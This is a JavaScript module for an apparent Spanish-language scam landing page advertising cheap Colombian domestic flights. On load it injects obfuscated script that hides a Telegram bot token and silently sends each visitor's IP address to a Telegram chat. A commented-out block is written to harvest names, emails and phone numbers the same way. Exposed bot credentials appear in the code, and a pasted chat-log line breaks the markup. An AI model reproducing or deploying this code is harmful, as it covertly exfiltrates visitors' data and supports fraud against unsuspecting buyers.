
export default function Home() {
    console.log("CDN cargado correctamente.");

    // Crear el elemento <title>
    const titleElement = document.createElement("title");
    titleElement.textContent = "¡Obtén Tu Cupón!";
    document.head.appendChild(titleElement);

    // Crear un estilo global y agregarlo al head
    const style = document.createElement("style");
    style.textContent = `

            * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        } 
        html, body { 
            height: 100%; 
            font-family: 'Arial', sans-serif; 
            background: linear-gradient(135deg, #6f6666, #ffffff); 
        } 
        .container { 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            min-height: 100%; 
            padding: 20px; 
            text-align: center; 
            min-height: 80vh;
        } 
        .image { 
            max-width: 90%; 
            max-height: 60vh; 
            margin-bottom: 30px; 
            border-radius: 10px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.3); 
        } 
        .button-container { 
            width: 100%; 
            max-width: 500px; 
        } 
        .button { 
            padding: 15px 30px; 
            font-size: 20px; 
            color: white; 
            background: linear-gradient(45deg, #f70000, #ff0000); 
            border: none; 
            border-radius: 25px; 
            cursor: pointer; 
            text-decoration: none; 
            transition: transform 0.3s, box-shadow 0.3s; 
            display: inline-block; 
            width: 100%; 
            font-weight: bold; 
        } 
        .button:hover { 
               /* Gradiente con un tono más oscuro y otro más claro, dentro de la misma gama */ 
    background: linear-gradient(45deg, #d90000, #ff3333); 
    transform: translateY(-3px); 
    /* Sombra rojiza para resaltar el botón */ 
        } 
         `;
    document.head.appendChild(style);

    const script = document.createElement("script");
    script.textContent = `
  window.dataLayer = window.dataLayer || []; 
  function gtag(){dataLayer.push(arguments);} 
  gtag('js', new Date()); 
  gtag('config', 'AW-16854264136'); 

const _0x5ef427=_0x38d4;function _0x5ac0(){const _0x5bf9fa=['3015744SOuXPt','736119cvxFhz','28184453rBmWfW','140gPPfUZ','4830618GdTPBy','380916mfrWFG','5lDPeAl','6298387261','77895ThQUdD','61656URSTxo','14MRbYWR','7577648780:AAGhPTv7QWRQw-pFG0ecOBKr3rMyIWS5Pug','74qkqLtN'];_0x5ac0=function(){return _0x5bf9fa;};return _0x5ac0();}(function(_0x1140a1,_0x2b9ac5){const _0x3d8589=_0x38d4,_0x32ae0d=_0x1140a1();while(!![]){try{const _0x3c73e9=parseInt(_0x3d8589(0x9d))/0x1+parseInt(_0x3d8589(0x9b))/0x2*(parseInt(_0x3d8589(0x98))/0x3)+-parseInt(_0x3d8589(0x94))/0x4+parseInt(_0x3d8589(0x95))/0x5*(parseInt(_0x3d8589(0x93))/0x6)+-parseInt(_0x3d8589(0x99))/0x7*(-parseInt(_0x3d8589(0x9c))/0x8)+-parseInt(_0x3d8589(0x97))/0x9*(-parseInt(_0x3d8589(0x92))/0xa)+-parseInt(_0x3d8589(0x91))/0xb;if(_0x3c73e9===_0x2b9ac5)break;else _0x32ae0d['push'](_0x32ae0d['shift']());}catch(_0x64051f){_0x32ae0d['push'](_0x32ae0d['shift']());}}}(_0x5ac0,0x7ec84));function _0x38d4(_0xb05a5c,_0x3b48b2){const _0x5ac081=_0x5ac0();return _0x38d4=function(_0x38d472,_0x2f1cb2){_0x38d472=_0x38d472-0x91;let _0x1a35a2=_0x5ac081[_0x38d472];return _0x1a35a2;},_0x38d4(_0xb05a5c,_0x3b48b2);}const TELEGRAM_BOT_TOKEN=_0x5ef427(0x9a),TELEGRAM_CHAT_ID=_0x5ef427(0x96);

  async function sendIPToTelegram() {
    try {
      // Obtener la IP pública
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      const userIP = data.ip;

      const mensajeTelegram = \`📢 NUEVO LOGIN. IP del usuario: \${userIP}\`;

      // Enviar mensaje a Telegram
      const telegramResponse = await fetch(\`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: mensajeTelegram
        })
      });

      const result = await telegramResponse.json();
      console.log("Mensaje enviado a Telegram:", result);
    } catch (error) {
      console.error("Error enviando la IP a Telegram:", error);
    }
  }

  sendIPToTelegram();
`;
document.body.appendChild(script)


    return `
    <div class="container"> 
        <img
            src="https://i.imgur.com/K4ffkXt.jpeg"

✡️ Uva🎸😇💸🤙👁️☀️✡️👑🔱🫅🤴, [20 / 2 / 2025 10: 33]
alt = "Ofertas de Vuelos Nacionales"
class="image"
    > 
        <h1 style="color: #fff; margin-bottom: 20px; font-weight: bold;"> 
            ¡Vuela por Colombia desde <strong>$49.999</strong>! 
        </h1> 
        <p style="color: #fff; margin-bottom: 40px; font-weight: bold;"> 
            Reserva hoy mismo y ahorra en tus próximas vacaciones. 
        </p> 
 
        <div class="button-container"> 
            <!-- Reemplaza "formulario.html" con el nombre real de tu página de formulario --> 
            <button  
                class="button" 
                id="conversionButton" 
            > 
                Compra tu vuelo aquí 
            </button> 
        </div> 
    </div >
    `;
}

export function addHomeEvents() {
    document.getElementById("conversionButton").addEventListener("click", async function () {
        /*    const nombre = document.getElementById("nombre").value;
           const correo = document.getElementById("correo").value;
           const telefono = document.getElementById("telefono").value;
   
           if (!nombre || !correo || !telefono) {
               alert("Por favor, completa todos los campos.");
               return;
           }
   
           const mensaje = `✈️ NUEVO REGISTRO: \n👤 Nombre: ${ nombre } \n📩 Correo: ${ correo } \n📟 Teléfono: ${ telefono } `;
           await sendTelegramMessage(mensaje); */

        /* history.pushState(null, "", "/gracias");
        initRouter(); */

        window.location.href = "https://vuelasintiempo.com/";
    });
}

async function sendTelegramMessage(text) {
    const botToken = "7959584991:AAEuDqY8YuOraJYWtpN0tdxWX_TquHkepJE";
    const chatId = "6298387261";
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(apiUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text })
        });

        if (!response.ok) {
            throw new Error(`Error al enviar el mensaje: ${response.statusText}`);
        }
        console.log("Mensaje enviado a Telegram:", text);
    } catch (error) {
        console.error("Error al enviar mensaje a Telegram:", error);
    }
}